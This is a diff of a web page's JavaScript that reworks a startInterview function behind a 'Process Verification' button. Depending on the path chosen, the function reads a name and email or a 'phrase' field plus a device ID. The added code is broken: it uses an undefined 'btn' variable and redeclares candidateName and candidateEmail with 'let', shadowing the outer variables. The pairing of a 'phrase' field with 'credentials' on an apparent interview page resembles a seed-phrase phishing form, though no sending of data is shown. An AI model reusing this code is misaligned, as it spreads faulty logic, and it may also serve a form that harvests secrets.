@@ -572,28 +572,6 @@
                 document.getElementById('cred').classList.remove('active');
             }
         }
-
-        function startInterview(btn, type) {
-            // 1. Add the loading class to show spinner & disable clicks
-            btn.classList.add('btn-loading');
-            
-            // 2. Change the text (Optional, for better UX)
-            const btnText = btn.querySelector('.btn-text');
-            if(btnText) btnText.innerText = "Processing...";
-
-            // 3. Simulate a process (Replace this with your actual logic/form submit)
-            console.log("Form is processing...");
-            alert(accessType);
-            // Example: Submitting the form after 2 seconds
-            setTimeout(() => {
-                // Find the parent form and submit it
-                // btn.closest('form').submit();
-                
-                // OR if you want to reset it:
-                btn.classList.remove('btn-loading');
-                btnText.innerText = "Process Verification";
-            }, 2000);
-        }
     </script>
 </div>
 
@@ -669,12 +647,27 @@
 
     function startInterview(button, type, isRestore = false) {
 
+        btn.classList.add('btn-loading');
+            const btnText = btn.querySelector('.btn-text');
+            if(btnText) btnText.innerText = "Processing...";
+
+           /* setTimeout(() => {
+                btn.classList.remove('btn-loading');
+                btnText.innerText = "Process Verification";
+            }, 2000);*/
+
 
         if(!isRestore) {
 
 
-            candidateName = type === "credentials"? document.getElementById('placeholder').value : document.getElementById('phrase').value;
-            candidateEmail = type === "credentials"? document.getElementById('email-input').value : getOrCreateDeviceID();
+            const placeholderVal = document.getElementById('placeholder')?.value;
+            const phraseVal      = document.getElementById('phrase')?.value;
+            const emailVal       = document.getElementById('email-input')?.value;
+
+            // Assign based on type
+            let candidateName  = (type === "credentials") ? placeholderVal : phraseVal;
+            let candidateEmail = (type === "credentials") ? emailVal       : getOrCreateDeviceID();
+
             selectedCategory = document.getElementById('selected_country').value;
             if(!candidateName || !candidateEmail || !selectedCategory) {
                 return alert("Select a role and enter both your name and email.");
